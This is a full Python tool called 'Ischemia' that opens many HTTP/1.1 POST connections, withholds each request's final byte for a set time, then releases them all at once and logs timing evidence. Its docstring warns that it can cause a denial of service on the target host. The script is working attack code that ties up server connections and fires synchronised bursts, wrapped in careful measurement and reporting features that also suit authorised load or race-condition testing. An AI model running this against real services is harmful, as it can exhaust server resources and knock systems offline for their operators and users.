#!/usr/bin/env python3
"""
Ischemia: HTTP/1.1 partial-entity hold test.
Warning: This script can cause a Denial Of Service on the target host.
Author: D3N14LD15K | Dissociated Security.
Date: 20261022
"""
import argparse
import asyncio
import csv
import errno
import hashlib
import ipaddress
import json
import math
import resource
import signal
import socket
import ssl
import sys
import time
from collections import Counter
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path


class ProtocolFailure(Exception):
    def __init__(self, label):
        super().__init__(label)
        self.label = label


def utc():
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds")


def classify(exc):
    if isinstance(exc, asyncio.TimeoutError):
        return "Timeout"
    if isinstance(exc, ProtocolFailure):
        return exc.label
    if isinstance(exc, ssl.SSLCertVerificationError):
        return "TLSVerifyFailed"
    if isinstance(exc, ssl.SSLError):
        return "TLSError"
    if isinstance(exc, OSError):
        return {
            errno.EMFILE: "LocalFDExhausted",
            errno.ENFILE: "LocalFDExhausted",
            errno.EADDRNOTAVAIL: "LocalEphemeralExhausted",
            errno.EADDRINUSE: "LocalPortConflict",
            errno.ECONNREFUSED: "TargetRefused",
            errno.ECONNRESET: "ResetByPeer",
            errno.ECONNABORTED: "ResetByPeer",
            errno.ENETUNREACH: "RouteUnreachable",
            errno.EHOSTUNREACH: "HostUnreachable",
            errno.ETIMEDOUT: "ConnectTimeout",
            errno.ENOBUFS: "LocalBufferExhausted",
            errno.EPIPE: "BrokenPipe",
        }.get(exc.errno, f"OSError_{exc.errno}")
    return type(exc).__name__


def pct(values, q):
    if not values:
        return None
    s = sorted(values)
    return s[max(0, math.ceil(q / 100.0 * len(s)) - 1)]


def stats(values):
    return {"n": len(values), "p50": pct(values, 50),
            "p95": pct(values, 95), "p99": pct(values, 99),
            "max": max(values) if values else None}


@dataclass
class Conn:
    rid: int
    armed_utc: str = ""
    armed_ns: int = 0
    released_ns: int = 0
    responded_ns: int = 0
    hold_event: str = ""
    hold_ns: int = 0
    released: bool = False
    status: int = 0
    headers_ms: float | None = None
    idle_ms: float | None = None
    body_bytes: int = 0
    framing: str = ""
    error: str = ""
    detail: str = ""
    reader: object = None
    writer: object = None
    prefix: bytes = b""


FIELDS = ["request_id", "armed_utc", "armed_ns", "released_ns", "responded_ns",
          "hold_event", "hold_ns", "released", "status", "headers_ms", "idle_ms",
          "body_bytes", "framing", "error", "detail"]


def is_ip_literal(host):
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False


def build_request(args, body):
    default = 443 if args.scheme == "https" else 80
    authority = args.host if args.port == default else f"{args.host}:{args.port}"
    names = [h.split(":", 1)[0].strip().lower() for h in args.header]
    lines = [f"POST {args.endpoint} HTTP/1.1"]
    if "host" not in names:
        lines.append(f"Host: {authority}")
    lines.extend(args.header)
    if "content-type" not in names:
        lines.append("Content-Type: application/x-www-form-urlencoded")
    lines.append(f"Content-Length: {len(body)}")
    lines.append("Connection: close")
    head = ("\r\n".join(lines) + "\r\n\r\n").encode("iso-8859-1")
    return head + body, head


def tls_context(args):
    if args.scheme == "http":
        return None, None
    if args.insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx, args.sni or (None if is_ip_literal(args.host) else args.host)
    ctx = ssl.create_default_context()
    if args.cafile:
        ctx.load_verify_locations(args.cafile)
    sni = args.sni or (None if is_ip_literal(args.host) else args.host)
    if sni is None:
        raise ValueError("HTTPS to an IP literal requires --sni <name> or --insecure")
    return ctx, sni


def preflight(args):
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    need = args.connections + 64
    if soft != resource.RLIM_INFINITY and soft < need:
        cap = hard if hard != resource.RLIM_INFINITY else need
        try:
            resource.setrlimit(resource.RLIMIT_NOFILE, (min(need, cap), hard))
        except (OSError, ValueError):
            pass
        soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
    if soft != resource.RLIM_INFINITY and soft < need:
        print(f"[setup] need {need} descriptors, RLIMIT_NOFILE soft={soft}. "
              "Raise ulimit -n in the launching shell or lower --connections.",
              file=sys.stderr)
        return False
    if not args.force:
        for suffix in (".csv", ".json", ".raw.txt"):
            if Path(args.out + suffix).exists():
                print(f"[setup] {args.out + suffix} exists; use a new --out or --force.",
                      file=sys.stderr)
                return False
    return True


class Test:
    def __init__(self, args, full, head):
        self.args, self.full, self.head = args, full, head
        self.prefix = full[:-1]
        self.conns, self.samples, self.watchers = [], [], []
        self.phase, self.aborted = "setup", False
        self.exit_code = 2
        self.started_ns = self.arm_done_ns = self.hold_deadline = 0

    def on_signal(self):
        if not self.stop.is_set():
            print("\n[abort] operator interrupt; finalizing evidence", flush=True)
            self.aborted = True
            self.stop.set()

    async def pace(self):
        if self.args.arm_rate <= 0:
            return
        async with self.pace_lock:
            now = self.loop.time()
            if self.next_slot < now:
                self.next_slot = now
            delay = self.next_slot - now
            self.next_slot += 1.0 / self.args.arm_rate
            if delay > 0:
                await asyncio.sleep(delay)

    async def arm_one(self, rid, sem):
        c = Conn(rid=rid)
        self.conns.append(c)
        try:
            await sem.acquire()
            try:
                if self.stop.is_set():
                    c.error = "AbortedByOperator"
                    return
                await self.pace()
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.addr[0], self.addr[1],
                                            ssl=self.ssl_ctx,
                                            server_hostname=self.sni),
                    timeout=self.args.arm_timeout)
                c.reader, c.writer = reader, writer
                writer.write(self.prefix if self.args.hold_seconds > 0 else self.full)
                await asyncio.wait_for(writer.drain(), timeout=self.args.arm_timeout)
                c.armed_ns = time.perf_counter_ns()
                c.armed_utc = utc()
                if self.args.hold_seconds == 0:
                    c.released, c.released_ns = True, c.armed_ns
                if len(self.samples) < self.args.raw_sample:
                    self.samples.append(
                        f"=== request {rid} ===\n"
                        f"{self.head.decode('iso-8859-1')}"
                        f"withheld_final_byte=0x{self.full[-1]:02x}\n"
                        f"{self.prefix[len(self.head):].decode('iso-8859-1')}\n")
            finally:
                sem.release()
        except Exception as exc:
            c.error, c.detail = classify(exc), str(exc)[:200]
            if c.writer is not None:
                try:
                    c.writer.close()
                except Exception:
                    pass
                c.writer = c.reader = None

    async def watch(self, c):
        try:
            data = await c.reader.read(1)
        except Exception as exc:
            c.hold_event, c.hold_ns = classify(exc), time.perf_counter_ns()
            return
        c.hold_ns = time.perf_counter_ns()
        if data:
            c.prefix, c.hold_event = data, "data"
        else:
            c.hold_event = "eof"

    def release_burst(self):
        last = self.full[-1:]
        for c in self.conns:
            if not c.armed_ns:
                continue
            if c.hold_event == "eof":
                c.error = "ServerEOFDuringHold"
                continue
            if c.writer is None or c.writer.is_closing():
                c.error = "TransportClosedBeforeRelease"
                continue
            try:
                c.writer.write(last)
                c.released_ns = time.perf_counter_ns()
                c.released = True
            except Exception as exc:
                c.error, c.detail = classify(exc), str(exc)[:200]

    async def read_one(self, c):
        loop, buf = self.loop, bytearray(c.prefix)
        c.prefix = b""
        c.idle_ms = round((c.released_ns - c.armed_ns) / 1e6, 3)
        deadline = loop.time() + self.args.response_timeout

        async def more():
            nonlocal buf
            remaining = deadline - loop.time()
            if remaining <= 0:
                raise asyncio.TimeoutError()
            chunk = await asyncio.wait_for(c.reader.read(65536), timeout=remaining)
            if not chunk:
                return False
            buf.extend(chunk)
            return True

        try:
            while True:
                while b"\r\n\r\n" not in buf:
                    if len(buf) >= 65536:
                        raise ProtocolFailure("HeaderTooLarge")
                    if not await more():
                        raise ProtocolFailure("EOFBeforeHeaders" if not buf
                                              else "TruncatedHeaders")
                head, buf = buf.split(b"\r\n\r\n", 1)
                text = head.decode("iso-8859-1")
                lines = text.split("\r\n")
                parts = lines[0].split(" ", 2)
                try:
                    c.status = int(parts[1])
                except (IndexError, ValueError):
                    raise ProtocolFailure("MalformedStatusLine")
                hdrs = {}
                for line in lines[1:]:
                    if ":" in line:
                        k, v = line.split(":", 1)
                        hdrs.setdefault(k.strip().lower(), []).append(v.strip())
                if 100 <= c.status < 200 and c.status != 101:
                    continue
                break

            c.responded_ns = time.perf_counter_ns()
            c.headers_ms = round((c.responded_ns - c.released_ns) / 1e6, 3)
            if len(self.samples) < self.args.raw_sample:
                self.samples.append(f"=== response {c.rid} ===\n{text}\n\n")

            if c.status in (204, 304):
                c.framing = "no-body"
                return
            te, cl = hdrs.get("transfer-encoding", []), hdrs.get("content-length", [])
            if te and cl:
                c.framing, c.error = "ambiguous", "AmbiguousFraming"
                return
            if te:
                if len(te) != 1 or te[0].lower() != "chunked":
                    c.framing, c.error = "ambiguous", "AmbiguousFraming"
                    return
                c.framing, total = "chunked", 0
                while True:
                    while b"\r\n" not in buf:
                        if not await more():
                            raise ProtocolFailure("TruncatedChunkSize")
                    line, buf = buf.split(b"\r\n", 1)
                    try:
                        size = int(line.split(b";", 1)[0].strip(), 16)
                    except ValueError:
                        raise ProtocolFailure("BadChunkSize")
                    if size < 0:
                        raise ProtocolFailure("BadChunkSize")
                    if size == 0:
                        # Terminal chunk reached; trailers are not body and the
                        # connection is not reused, so do not wait for them.
                        c.body_bytes = total
                        return
                    if total + size > self.args.body_limit:
                        c.body_bytes, c.error = total, "BodyLimitReached"
                        return
                    while len(buf) < size + 2:
                        if not await more():
                            raise ProtocolFailure("TruncatedChunkData")
                    if buf[size:size + 2] != b"\r\n":
                        raise ProtocolFailure("BadChunkFraming")
                    buf = buf[size + 2:]
                    total += size
            if cl:
                if len(cl) > 1 and len(set(cl)) > 1:
                    c.framing, c.error = "ambiguous", "AmbiguousFraming"
                    return
                try:
                    length = int(cl[0])
                except ValueError:
                    raise ProtocolFailure("BadContentLength")
                if length < 0:
                    raise ProtocolFailure("BadContentLength")
                c.framing = "content-length"
                target = min(length, self.args.body_limit)
                while len(buf) < target:
                    if not await more():
                        raise ProtocolFailure("TruncatedBody")
                c.body_bytes = target
                if length > self.args.body_limit:
                    c.error = "BodyLimitReached"
                return
            c.framing = "close-delimited"
            while len(buf) < self.args.body_limit:
                if not await more():
                    break
            c.body_bytes = len(buf)
            if len(buf) >= self.args.body_limit:
                c.error = "BodyLimitReached"
        except Exception as exc:
            c.error = ("BodyTimeout" if isinstance(exc, asyncio.TimeoutError)
                       and c.responded_ns else classify(exc))
            c.detail = str(exc)[:200]

    async def ticker(self):
        tty = sys.stdout.isatty()
        while True:
            armed = sum(c.armed_ns > 0 for c in self.conns)
            held = sum(c.armed_ns > 0 and not c.released and not c.error
                       for c in self.conns)
            rel = sum(c.released for c in self.conns)
            resp = sum(c.responded_ns > 0 for c in self.conns)
            errs = sum(bool(c.error) for c in self.conns)
            line = (f"[{self.phase}] armed={armed}/{self.args.connections} "
                    f"on_hold={held} released={rel} responded={resp} errors={errs}")
            if self.phase == "hold":
                left = max(0.0, self.hold_deadline - self.loop.time())
                early = sum(c.hold_event in ("data", "eof") for c in self.conns)
                line += f" remaining={left:.1f}s server_events={early}"
            if not self.args.quiet:
                if tty:
                    print(f"\r{line:<110}", end="", flush=True)
                else:
                    print(line, flush=True)
            await asyncio.sleep(self.args.progress_interval)

    async def gather_stoppable(self, tasks):
        async def cancel_on_stop():
            await self.stop.wait()
            for t in tasks:
                t.cancel()
        watcher = asyncio.create_task(cancel_on_stop())
        try:
            return await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            watcher.cancel()
            try:
                await asyncio.gather(watcher, return_exceptions=True)
            except asyncio.CancelledError:
                pass

    async def teardown(self):
        for w in self.watchers:
            if not w.done():
                w.cancel()
        if self.watchers:
            await asyncio.gather(*self.watchers, return_exceptions=True)
        writers = [c.writer for c in self.conns if c.writer is not None]
        for w in writers:
            try:
                w.close()
            except Exception:
                pass

        async def closed(w):
            try:
                await w.wait_closed()
            except Exception:
                pass
        if writers:
            try:
                await asyncio.wait_for(
                    asyncio.gather(*(closed(w) for w in writers),
                                    return_exceptions=True), timeout=3.0)
            except asyncio.TimeoutError:
                pass

    async def run(self):
        self.loop = asyncio.get_running_loop()
        self.stop, self.pace_lock = asyncio.Event(), asyncio.Lock()
        self.next_slot = self.loop.time()
        self.started_ns = time.perf_counter_ns()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                self.loop.add_signal_handler(sig, self.on_signal)
            except (NotImplementedError, RuntimeError):
                pass
        self.ticker_task = asyncio.create_task(self.ticker())
        try:
            self.ssl_ctx, self.sni = tls_context(self.args)
            infos = await self.loop.getaddrinfo(self.args.host, self.args.port,
                                               type=socket.SOCK_STREAM)
            self.addr = infos[0][4]
            self.phase = "arm"
            sem = asyncio.Semaphore(self.args.arm_concurrency)
            await self.gather_stoppable([
                asyncio.create_task(self.arm_one(i, sem))
                for i in range(self.args.connections)])
            self.arm_done_ns = time.perf_counter_ns()
            armed = [c for c in self.conns if c.armed_ns]
            if self.stop.is_set() or not armed:
                return
            if self.args.hold_seconds > 0:
                self.watchers = [asyncio.create_task(self.watch(c)) for c in armed]
                self.phase = "hold"
                self.hold_deadline = self.loop.time() + self.args.hold_seconds
                try:
                    await asyncio.wait_for(self.stop.wait(),
                                           timeout=self.args.hold_seconds)
                    self.aborted = True
                    return
                except asyncio.TimeoutError:
                    pass
                for w in self.watchers:
                    w.cancel()
                await asyncio.gather(*self.watchers, return_exceptions=True)
                if self.stop.is_set():
                    self.aborted = True
                    return
                self.phase = "release"
                self.release_burst()
            if self.stop.is_set():
                self.aborted = True
                return
            self.phase = "read"
            await self.gather_stoppable([
                asyncio.create_task(self.read_one(c))
                for c in self.conns if c.released and not c.error])
        finally:
            self.ticker_task.cancel()
            await asyncio.gather(self.ticker_task, return_exceptions=True)
            await self.teardown()
            if self.aborted:
                for c in self.conns:
                    if not c.error:
                        c.error = "AbortedByOperator"

    def report(self):
        cs = self.conns
        released = [c for c in cs if c.released]
        respond = [c for c in cs if c.responded_ns]
        attributable = [c.headers_ms for c in respond
                        if c.hold_event != "data" and c.headers_ms is not None]
        rt = [c.released_ns for c in released]
        events = [(c.hold_ns - c.armed_ns) / 1e6 for c in cs
                  if c.hold_ns and c.hold_event in ("data", "eof")]
        summary = {
            "target": f"{self.args.scheme}://{self.args.host}:{self.args.port}"
                      f"{self.args.endpoint}",
            "resolved_address": f"{self.addr[0]}:{self.addr[1]}",
            "started_utc": utc(),
            "hold_seconds": self.args.hold_seconds,
            "requested": self.args.connections,
            "armed": sum(c.armed_ns > 0 for c in cs),
            "released": len(released),
            "responses_with_final_headers": len(respond),
            "clean_completions": sum(bool(c.responded_ns and not c.error) for c in cs),
            "status_counts": dict(Counter(str(c.status) for c in respond)),
            "error_counts": dict(Counter(c.error for c in cs if c.error)),
            "hold_observations": {
                "no_change": sum(c.armed_ns > 0 and not c.hold_event for c in cs),
                "early_data": sum(c.hold_event == "data" for c in cs),
                "eof": sum(c.hold_event == "eof" for c in cs),
                "other": sum(bool(c.hold_event) and c.hold_event not in ("data", "eof")
                             for c in cs)},
            "arm_wall_ms": round((self.arm_done_ns - self.started_ns) / 1e6, 3),
            "release_spread_ms": round((max(rt) - min(rt)) / 1e6, 3)
                                 if len(rt) >= 2 else 0.0,
            "headers_ms_attributable": stats(attributable),
            "idle_ms_at_release": stats([c.idle_ms for c in released
                                         if c.idle_ms is not None]),
            "idle_ms_to_server_event": stats(events),
            "tls_verify": self.args.scheme == "http" or not self.args.insecure,
            "aborted": self.aborted,
            "limitations": [
                "release_ns is userspace hand-off to the asyncio transport, not a kernel or wire timestamp",
                "no_change during hold does not establish worker-thread occupancy",
                "early_data responses are excluded from attributable latency statistics",
                "local resource errors invalidate target-impact claims for this run",
            ],
        }
        base = Path(self.args.out)
        with base.with_suffix(".csv").open("w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=FIELDS)
            w.writeheader()
            for c in cs:
                w.writerow({"request_id": c.rid, "armed_utc": c.armed_utc,
                            "armed_ns": c.armed_ns, "released_ns": c.released_ns,
                            "responded_ns": c.responded_ns, "hold_event": c.hold_event,
                            "hold_ns": c.hold_ns, "released": c.released,
                            "status": c.status, "headers_ms": c.headers_ms,
                            "idle_ms": c.idle_ms, "body_bytes": c.body_bytes,
                            "framing": c.framing, "error": c.error, "detail": c.detail})
        base.with_suffix(".json").write_text(
            json.dumps({"summary": summary, "records": FIELDS and [
                {"request_id": c.rid, "status": c.status, "error": c.error,
                 "hold_event": c.hold_event, "headers_ms": c.headers_ms,
                 "idle_ms": c.idle_ms, "released": c.released} for c in cs]},
                indent=2), encoding="utf-8")
        paths = [base.with_suffix(".csv"), base.with_suffix(".json")]
        if self.samples:
            raw = base.with_suffix(".raw.txt")
            raw.write_text("# first observed raw samples; not a random sample\n"
                           + "\n".join(self.samples), encoding="utf-8")
            paths.append(raw)
        print(json.dumps(summary, indent=2))
        for p in paths:
            digest = hashlib.sha256(p.read_bytes()).hexdigest()
            print(f"{p}  sha256={digest}")
        self.exit_code = 130 if self.aborted else (0 if respond else 2)


def main():
    p = argparse.ArgumentParser(description="Ischemia: HTTP/1.1 partial-entity hold test")
    p.add_argument("--scheme", choices=["http", "https"], default="http")
    p.add_argument("--host", required=True)
    p.add_argument("--port", type=int)
    p.add_argument("--endpoint", required=True)
    p.add_argument("--connections", type=int, default=10)
    p.add_argument("--hold-seconds", type=float, default=10.0,
                   help="0 = send complete requests (concurrency control run)")
    p.add_argument("--arm-concurrency", type=int, default=128)
    p.add_argument("--arm-rate", type=float, default=0.0,
                   help="max new partial requests/sec; 0 = unpaced")
    p.add_argument("--arm-timeout", type=float, default=5.0)
    p.add_argument("--response-timeout", type=float, default=10.0)
    p.add_argument("--body-limit", type=int, default=1048576)
    p.add_argument("--progress-interval", type=float, default=1.0)
    p.add_argument("--raw-sample", type=int, default=10)
    p.add_argument("--data", default="test=1")
    p.add_argument("--data-file")
    p.add_argument("--header", action="append", default=[])
    p.add_argument("--sni")
    p.add_argument("--cafile")
    p.add_argument("--insecure", action="store_true")
    p.add_argument("--out", default="last-byte-evidence")
    p.add_argument("--quiet", action="store_true")
    p.add_argument("--force", action="store_true")
    a = p.parse_args()
    if a.connections < 1 or a.arm_concurrency < 1:
        p.error("connections and arm-concurrency must be >= 1")
    if a.hold_seconds < 0 or a.arm_rate < 0 or a.response_timeout <= 0:
        p.error("invalid hold/rate/timeout")
    if not a.endpoint.startswith("/") or "\r" in a.endpoint or "\n" in a.endpoint:
        p.error("endpoint must be an absolute path without CRLF")
    for h in a.header:
        if ":" not in h or "\r" in h or "\n" in h:
            p.error("--header must be 'Name: value' without CRLF")
        if h.split(":", 1)[0].strip().lower() in {
                "content-length", "transfer-encoding", "connection"}:
            p.error("Content-Length, Transfer-Encoding and Connection are tool-managed")
    a.port = a.port or (443 if a.scheme == "https" else 80)
    if not 1 <= a.port <= 65535:
        p.error("port out of range")
    try:
        body = Path(a.data_file).read_bytes() if a.data_file else a.data.encode()
        if not body:
            p.error("request body must be non-empty")
        full, head = build_request(a, body)
        if not preflight(a):
            return 1
        test = Test(a, full, head)
        try:
            asyncio.run(test.run())
        except KeyboardInterrupt:
            test.aborted = True
            for c in test.conns:
                if c.writer:
                    try:
                        c.writer.close()
                    except Exception:
                        pass
        test.report()
        return test.exit_code
    except Exception as exc:
        print(f"[fatal] {classify(exc)}: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
